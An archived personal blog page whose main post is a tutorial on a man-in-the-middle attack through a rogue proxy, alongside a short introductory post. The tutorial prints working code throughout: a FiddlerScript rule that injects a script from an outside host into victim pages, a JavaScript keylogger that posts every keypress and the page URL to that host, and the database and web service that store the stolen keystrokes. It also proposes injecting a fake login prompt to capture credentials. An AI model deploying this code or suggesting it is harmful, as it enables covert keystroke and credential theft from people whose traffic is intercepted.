<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Archives: 2015 | vijshank</title>
  <meta name="author" content="Vijay Shankar">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="vijshank"/>

  
    <meta property="og:image" content="undefined"/>
  

  <link href="/favicon.png" rel="icon">
  <link rel="alternate" href="/atom.xml" title="vijshank" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  

</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">vijshank</a></h1>
  <h2><a href="/">a.k.a. Vijay Shankar</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
      <li><a href="/whoami">whoami</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper">
<h2 class="archive-title">2015</h2>


  
    <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2015-02-11T15:38:45.000Z"><a href="/2015/02/11/Man-in-the-middle-and-the-javascript-keylogger/">Feb 11 2015</a></time>
      
      
  
    <h1 class="title"><a href="/2015/02/11/Man-in-the-middle-and-the-javascript-keylogger/">Man-in-the-middle and the JavaScript Keylogger</a></h1>
  

    </header>
    <div class="entry">
      
        <p>This blog post is a simple experiment to show how to implement a JavaScript keylogger and test it. </p>
<p>When a website is HTTPS enabled, it ensures that your communication to the website is encrypted and is protected against <a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack" target="_blank" rel="external">man-in-the-middle (MITM)</a> attacks. MITM attacks look very unlikely to happen, but they are actually very likely. </p>
<h3 id="Take_a_look_at_how_MITM_attack_works:"><strong>Take a look at how MITM attack works:</strong></h3>
<p><img src="/2015/02/11/Man-in-the-middle-and-the-javascript-keylogger/mitm1.svg" alt=""></p>
<p><strong>How can a hacker intercept the traffic of the user?</strong><br>It could be through malware which was spread to the victim or even through tapping into hardware such as a switch or router the victim connects to. </p>
<p>In our experiment, we take the all too familiar case where the victim uses a proxy server found online to bypass the network restrictions. This is a common scenario in workplaces, schools and colleges where a lot of popular sites are made inaccessible by the network admin. In such cases, users usually search online for a proxy server and use it. In our scenario, the proxy server is owned by the hacker which enables the attack:</p>
<p><img src="/2015/02/11/Man-in-the-middle-and-the-javascript-keylogger/mitm2.svg" alt=""></p>
<p>A lot of sites have a http homepage, but have a link on their homepage for login that takes the user to a https enabled page that asks for credentials (Example - <a href="http://amazon.com/" target="_blank" rel="external">amazon.com</a>). </p>
<p><strong>What’s wrong with this approach?</strong><br>The hacker who can intercept the http homepage can also add a prompt for the user’s credentials at the homepage itself. This login prompt can also be specifically crafted with CSS that matches the website, so as not to look suspicious to the user. </p>
<p>If you look at step (4) in the above picture, the hacker sends back the requested webpage to the user with some malicious code attached. In our scenario, we attach two things to the page that is returned to the user from the proxy server in step (4):<br>1) <em>A javascript keylogger</em> that sends every keypress made on the page to a webservice that is somewhere hosted by the hacker.<br>2) <em>A login prompt</em> (if not already present in the page) asking the user to enter the credentials to the site. </p>
<h2 id="The_Experiment"><strong>The Experiment</strong></h2>
<p><strong>Our experiment setup:</strong></p>
<p><img src="/2015/02/11/Man-in-the-middle-and-the-javascript-keylogger/mitm3.svg" alt=""></p>
<h3 id="Setting_up_the_proxy_server:"><strong>Setting up the proxy server</strong>:</h3>
<p>To simplify this step, I am using Fiddler as the proxy server. After installing fiddler,  enable “Allow remote computers to connect” in options:</p>
<p><img src="/2015/02/11/Man-in-the-middle-and-the-javascript-keylogger/FiddlerOptions.png" alt=""></p>
<p>Now you will be able to see the http traffic of anyone using this machine:port as their proxy server. The next step is to automatically attach our malicious code when sending the response back to the victim. This can be done using fiddler’s fiddlerscript feature. Press Ctrl + R to open FiddlerScript. The below modification to OnBeforeResponse() will make sure that the keylogger script is added to every page request returned to the victim. </p>
<figure class="highlight [C#]"><figcaption><span>FiddlerScript</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">OnBeforeResponse</span><span class="params">(oSession: Session)</span> </span>{</div><div class="line">        </div><div class="line">        <span class="keyword">if</span> (oSession.hostname.Contains(<span class="string">"InsertTheVictimSiteHere.com"</span>)) </div><div class="line">        {</div><div class="line">            oSession.utilDecodeResponse();</div><div class="line">            oSession.utilReplaceInResponse(<span class="string">'&lt;/head&gt;'</span>, <span class="string">'&lt;script src="http://lekeylogger.azurewebsites.net/Logger.js"&gt;&lt;/script&gt;'</span> + <span class="string">'&lt;/head&gt;'</span>);</div><div class="line">        }</div><div class="line">        </div><div class="line">    }</div></pre></td></tr></table></figure>

<p>The keylogger code <em>Logger.js</em> will be downloaded by the user’s browser. Note that in our experiment, the Logger.js file is hosted on the server where the webservice is hosted (lekeylogger.azurewebsites.net).</p>
<h3 id="The_JavaScript_Keylogger:"><strong>The JavaScript Keylogger</strong>:</h3>
<p>We implement the keylogger through a function to handle the onkeypress event. Inside the function, we send the pressed key to our service. We also send the an unique InstanceID, SequenceNumber and the current url of the page along with the keystroke:</p>
<figure class="highlight [C#]"><figcaption><span>JavaScript Keylogger</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">InstanceID = <span class="built_in">Math</span>.random().toString(<span class="number">36</span>).slice(<span class="number">2</span>);</div><div class="line">SequenceNumber = <span class="number">0</span>;</div><div class="line"><span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span> <span class="params">(evt)</span> </span>{</div><div class="line">    evt = evt || <span class="built_in">window</span>.event</div><div class="line">    key = <span class="built_in">String</span>.fromCharCode(evt.charCode)</div><div class="line">    <span class="keyword">if</span> (key) {</div><div class="line">        $.ajax({</div><div class="line">            url: <span class="string">'http://lekeylogger.azurewebsites.net/api/Key'</span>,</div><div class="line">            type: <span class="string">'Post'</span>,</div><div class="line">            data: <span class="built_in">JSON</span>.stringify({ InstanceID: InstanceID, SequenceNumber: ++SequenceNumber, KeyValue: key, Referer: <span class="built_in">document</span>.URL }),</div><div class="line">            contentType: <span class="string">"application/json"</span>,</div><div class="line">            success: <span class="function"><span class="keyword">function</span> <span class="params">(data)</span> </span>{ },</div><div class="line">            error: <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>{ }</div><div class="line">        });</div><div class="line">    }</div><div class="line">}</div></pre></td></tr></table></figure>

<h3 id="The_WebService_to_record_keystrokes:"><strong>The WebService to record keystrokes</strong>:</h3>
<p>We create a database with the following table:</p>
<figure class="highlight [SQL]"><figcaption><span>Keys table:</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> [dbo].[Keys]</span></div><div class="line">(</div><div class="line">	[InstanceID] <span class="keyword">NVARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>, </div><div class="line">    [SequenceNumber] <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</div><div class="line">    [Referer] <span class="keyword">NVARCHAR</span>(<span class="number">256</span>) <span class="literal">NULL</span>,  </div><div class="line">    [KeyValue] <span class="keyword">NCHAR</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>, </div><div class="line">    <span class="keyword">CONSTRAINT</span> [PK_Keys] <span class="keyword">PRIMARY</span> <span class="keyword">KEY</span> ([InstanceID], [SequenceNumber])</div><div class="line">)</div></pre></td></tr></table></figure>

<p>The service is a pretty simple Asp.NET webapi:</p>
<figure class="highlight [C#]"><figcaption><span>Web service to log keystrokes:</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> KeyLogger.Models;</div><div class="line"><span class="keyword">using</span> System.Web.Http;</div><div class="line"></div><div class="line">namespace KeyLogger.Controllers</div><div class="line">{</div><div class="line">    <span class="keyword">public</span> <span class="keyword">class</span> KeyController : ApiController</div><div class="line">    {</div><div class="line">        <span class="keyword">public</span> IHttpActionResult <span class="title">Post</span>(Key key)</div><div class="line">        {</div><div class="line">            <span class="keyword">using</span> (KeyDBEntities keyDB = <span class="keyword">new</span> KeyDBEntities())</div><div class="line">            {</div><div class="line">                keyDB.Keys.Add(key);</div><div class="line">                keyDB.SaveChanges();</div><div class="line">            }</div><div class="line"></div><div class="line">            <span class="keyword">return</span> Ok();</div><div class="line">        }</div><div class="line">    }</div><div class="line">}</div></pre></td></tr></table></figure>

<p>The setup is complete. On changing to this proxy server and visiting the website, the keystrokes made in the browser window are sent to the service and logged in our database:</p>
<p><img src="/2015/02/11/Man-in-the-middle-and-the-javascript-keylogger/query.png" alt=""></p>
<p>That’s all folks!</p>
<p>P.S: The code for this experiment is at: <a href="https://github.com/cracker2excel/lekeylogger" target="_blank" rel="external">https://github.com/cracker2excel/lekeylogger</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2015-02-06T14:58:55.000Z"><a href="/2015/02/06/Hello-World/">Feb 6 2015</a></time>
      
      
  
    <h1 class="title"><a href="/2015/02/06/Hello-World/">Hello World?</a></h1>
  

    </header>
    <div class="entry">
      
        <p>I have started a blog. Again. After spending few hours on learning and experimenting with <a href="https://pages.github.com/" target="_blank" rel="external">GitHub pages</a> and <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>, the blog is up and running. <strong>Note:</strong> 90% of those “few hours” were spent checking out Hexo themes and tweaking layout/CSS. I am still not satisfied -_-</p>
<p>Anyways, I have been wanting to have an online presence as a developer for a while. I have been following <a href="http://www.hanselman.com/" target="_blank" rel="external">Scott Hanselman</a>, <a href="http://blog.codinghorror.com/" target="_blank" rel="external">Jeff Atwood</a>, <a href="http://www.joelonsoftware.com/" target="_blank" rel="external">Joel Spolsky</a> and few others.</p>
<p>Here I go! Wish me luck!</p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  

  <nav id="pagination">
  
  
  <div class="clearfix"></div>
</nav>
</div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="Search">
    <input type="hidden" name="q" value="site:vijshank.com">
  </form>
</div>

  
<div class="widget tag">
  <h3 class="title">Categories</h3>
  <ul class="entry">
  
    <li><a href="/categories/Security/Fiddler/">Fiddler</a><small>1</small></li>
  
    <li><a href="/categories/Nothing-in-particular/">Nothing in particular</a><small>1</small></li>
  
    <li><a href="/categories/Security/">Security</a><small>1</small></li>
  
  </ul>
</div>


  
</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  
  &copy; 2015 Vijay Shankar
  
</div>
<div class="clearfix"></div></footer>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>


<script type="text/javascript">
var disqus_shortname = 'vijshank';

(function(){
  var dsq = document.createElement('script');
  dsq.type = 'text/javascript';
  dsq.async = true;
  dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
}());
</script>



</body>
</html>